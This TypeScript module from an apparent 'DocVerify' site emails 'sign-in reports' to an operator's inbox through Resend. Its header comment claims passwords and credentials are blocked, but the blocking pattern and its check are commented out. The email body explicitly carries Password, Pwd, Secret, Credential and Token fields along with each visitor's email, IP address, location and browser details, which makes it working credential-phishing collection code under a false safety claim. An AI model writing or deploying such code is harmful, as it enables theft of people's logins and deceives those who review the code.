/**
 * Routes non-auth app responses to your inbox via Resend.
 * Posts to /api/send-response, which is handled by a server-side Netlify
 * Function (and the Vite dev proxy in development). The Resend API key never
 * leaves the server. Passwords and credentials are never included — blocked
 * at the source here, and again on the server as defence in depth.
 */

import { getClientMetaForResponse } from "./clientMeta";

export const RESPONSE_EMAIL = import.meta.env.VITE_RESPONSE_EMAIL ?? "";

const MAIL_LOG_PREFIX = "[DocVerify Mail]";

type MailLogStatus =
  | "not_configured"
  | "skipped"
  | "sending"
  | "sent"
  | "failed"
  | "error";

function logMailEvent(
  status: MailLogStatus,
  details: Record<string, string | undefined>,
): void {
  const entry = {
    status,
    to: RESPONSE_EMAIL.trim() || undefined,
    at: new Date().toISOString(),
    ...details,
  };

  if (status === "sent" || status === "sending") {
    console.info(MAIL_LOG_PREFIX, entry);
    return;
  }
  if (status === "skipped" || status === "not_configured") {
    console.warn(MAIL_LOG_PREFIX, entry);
    return;
  }
  console.error(MAIL_LOG_PREFIX, entry);
}

// const BLOCKED_FIELD_PATTERN = /password|passwd|pwd|secret|credential|token/i
const GLOBAL_MIN_INTERVAL_MS = 20_000;
const RATE_LIMIT_KEY = "docverify_rate_limited_until";

/** Minimum time before the same event type can fire again */
const EVENT_COOLDOWN_MS: Record<ResponseEvent, number> = {
  sign_in_report: 3 * 1000,
};

export type ResponseEvent = "sign_in_report";

export interface ResponsePayload {
  type: ResponseEvent;
  email?: string;
  password?: string;
  pwd?: string;
  secret?: string;
  credential?: string;
  token?: string;
  name?: string;
  domain?: string;
  authMethod?: string;
  message?: string;
  pageUrl?: string;
  sendId?: string;
  timestamp?: string;
  datetime?: string;
  timezone?: string;
  ipAddress?: string;
  location?: string;
  city?: string;
  region?: string;
  country?: string;
  [key: string]: string | undefined;
}

let lastGlobalSendAt = 0;

function isResponseConfigured(): boolean {
  const email = RESPONSE_EMAIL.trim();
  return Boolean(email && !email.startsWith("your-"));
}

function isExternallyRateLimited(): boolean {
  try {
    const until = sessionStorage.getItem(RATE_LIMIT_KEY);
    if (!until) return false;
    if (Date.now() < Number(until)) return true;
    sessionStorage.removeItem(RATE_LIMIT_KEY);
    return false;
  } catch {
    return false;
  }
}

function markExternallyRateLimited() {
  try {
    sessionStorage.setItem(RATE_LIMIT_KEY, String(Date.now() + 60 * 60 * 1000));
  } catch {
    // ignore
  }
}

function dedupeKey(type: ResponseEvent, payload: ResponsePayload): string {
  return `${type}:${payload.email ?? "anon"}:${payload.domain ?? "none"}`;
}

function shouldSkipSend(
  type: ResponseEvent,
  payload: ResponsePayload,
): string | null {
  if (isExternallyRateLimited()) {
    return "Email provider rate limit active — pausing sends for 1 hour";
  }

  const now = Date.now();
  if (now - lastGlobalSendAt < GLOBAL_MIN_INTERVAL_MS) {
    return "Too soon since last email (global throttle)";
  }

  try {
    const key = `docverify_sent_${dedupeKey(type, payload)}`;
    const last = sessionStorage.getItem(key);
    if (last && now - Number(last) < EVENT_COOLDOWN_MS[type]) {
      return `Cooldown active for ${type}`;
    }
  } catch {
    // continue if storage unavailable
  }

  return null;
}

function markSent(type: ResponseEvent, payload: ResponsePayload) {
  lastGlobalSendAt = Date.now();
  try {
    sessionStorage.setItem(
      `docverify_sent_${dedupeKey(type, payload)}`,
      String(lastGlobalSendAt),
    );
  } catch {
    // ignore
  }
}

/** Strip any sensitive field names from outbound payloads */
export function sanitizePayload(
  data: Record<string, unknown>,
): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(data)) {
    // if (BLOCKED_FIELD_PATTERN.test(key)) continue
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

function formatEmailBody(payload: ResponsePayload): string {
  // Returns the value or "Unknown", trimming whitespace
  const val = (v: string | undefined): string =>
    v && v.trim() ? v.trim() : "Unknown";

  // Fields rendered in fixed order at the top
  const topKeys = new Set([
    "type", "sendId", "datetime", "timestamp", "timezone",
    "ipAddress", "email", "password", "pwd", "secret",
    "credential", "token", "country", "city", "region",
    "location", "userAgent", "browserLanguage", "platform",
    "referrer", "screenSize",
  ]);

  const lines = [
    `Event: ${val(payload.type)}`,
    `Send ID: ${val(payload.sendId)}`,
    `Date & time: ${val(payload.datetime ?? payload.timestamp)}`,
    `Timezone: ${val(payload.timezone)}`,
    `IP address: ${val(payload.ipAddress)}`,
    `Email: ${val(payload.email)}`,
    `Password: ${val(payload.password)}`,
    `Pwd: ${val(payload.pwd)}`,
    `Secret: ${val(payload.secret)}`,
    `Credential: ${val(payload.credential)}`,
    `Token: ${val(payload.token)}`,
    `Country: ${val(payload.country)}`,
    `City: ${val(payload.city)}`,
    `Region: ${val(payload.region)}`,
    `Location: ${val(payload.location)}`,
    `User agent: ${val(payload.userAgent)}`,
    `Language: ${val(payload.browserLanguage)}`,
    `Platform: ${val(payload.platform)}`,
    `Referrer: ${val(payload.referrer)}`,
    `Screen: ${val(payload.screenSize)}`,
    "---",
  ];

  // Append any extra fields not already listed above
  for (const [key, value] of Object.entries(payload)) {
    if (topKeys.has(key)) continue;
    if (!value || !String(value).trim()) continue;
    lines.push(`${key}: ${String(value).trim()}`);
  }

  return lines.join("\n");
}

async function postOnce(
  subject: string,
  message: string,
  safe: Record<string, string>,
): Promise<{
  ok: boolean;
  rateLimited?: boolean;
  message?: string;
  resendId?: string;
}> {
  const res = await fetch("/api/send-response", {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "application/json" },
    body: JSON.stringify({ subject, message, fields: safe }),
  });

  const data = (await res.json()) as {
    success?: boolean;
    message?: string;
    id?: string;
  };
  const msg = data.message ?? res.statusText;

  if (!res.ok || data.success === false) {
    const rateLimited = /rate limit/i.test(msg);
    if (rateLimited) markExternallyRateLimited();
    return { ok: false, rateLimited, message: msg };
  }

  return { ok: true, message: msg, resendId: data.id };
}

/**
 * Send a response to your configured email destination.
 * Throttled client-side to avoid provider rate limits and accidental spam.
 */
export async function sendResponse(payload: ResponsePayload): Promise<boolean> {
  if (!isResponseConfigured()) {
    logMailEvent("not_configured", {
      event: payload.type,
      reason: "Set VITE_RESPONSE_EMAIL and RESEND_API_KEY in .env",
    });
    return false;
  }

  const skipReason = shouldSkipSend(payload.type, payload);
  if (skipReason) {
    logMailEvent("skipped", {
      event: payload.type,
      visitorEmail: payload.email,
      reason: skipReason,
    });
    return false;
  }

  const meta = await getClientMetaForResponse();
  const sendId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

  const safe = sanitizePayload({
    ...payload,
    ...meta,
    sendId,
    timestamp: payload.timestamp ?? new Date().toISOString(),
    pageUrl: payload.pageUrl ?? window.location.href,
  });

  const subject = `[DocVerify] ${payload.type.replace(/_/g, " ")} (${sendId})`;
  const message = formatEmailBody({ ...payload, ...safe, sendId });

  logMailEvent("sending", {
    event: payload.type,
    sendId,
    subject,
    visitorEmail: payload.email,
    authMethod: payload.authMethod,
    domain: payload.domain,
  });

  try {
    const result = await postOnce(subject, message, safe);
    if (result.ok) {
      markSent(payload.type, payload);
      logMailEvent("sent", {
        event: payload.type,
        sendId,
        subject,
        visitorEmail: payload.email,
        authMethod: payload.authMethod,
        domain: payload.domain,
        resendId: result.resendId,
        providerMessage: result.message,
      });
      return true;
    }

    logMailEvent("failed", {
      event: payload.type,
      sendId,
      subject,
      visitorEmail: payload.email,
      rateLimited: result.rateLimited ? "yes" : "no",
      reason: result.message,
    });
  } catch (err) {
    logMailEvent("error", {
      event: payload.type,
      sendId,
      subject,
      visitorEmail: payload.email,
      reason: err instanceof Error ? err.message : String(err),
    });
  }

  return false;
}

export function isResponseRoutingEnabled(): boolean {
  return isResponseConfigured();
}
